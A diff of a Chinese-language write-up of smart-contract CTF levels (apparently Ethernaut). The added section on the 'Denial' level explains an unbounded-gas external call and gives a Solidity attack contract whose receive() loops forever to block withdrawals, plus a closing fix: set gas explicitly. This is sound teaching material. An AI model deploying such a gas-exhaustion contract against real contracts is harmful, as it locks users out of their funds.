@@ -388,3 +388,20 @@ print(2**256-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)
 cast send "" "revise(uint256, bytes32)" 35707666377435648211887908874984608119992236509074197713628505308453184860938 ""
 ```
 本来想写攻击合约的，结果`forge-std`不支持0.5.0这么古老的版本，只能用foundry命令行了
+
+## Denial
+
+`partner.call`处未指定调用时付出的最大gas。如果一个恶意合约故意在`receive`函数中实现高gas的逻辑，可能导致剩余的gas无法支持函数后续的逻辑
+```solidity
+contract Attack {
+    Denial target=Denial(payable(address()));
+    function exploit() public {
+        target.setWithdrawPartner(payable(address(this)));
+    }
+    receive() external payable {
+        while(true) {
+        }
+    }
+}
+```
+这也是为什么调用外部的call时应显式指定gas。另外，外部的call最多能使用当前gas的 $\frac{63}{64}$ ，所以如果在最开始就给足gas，使 $\frac{1}{64}$ 的gas足够覆盖剩余的逻辑，也不会出现这题的dos（denial of service）问题（但是何必呢？）
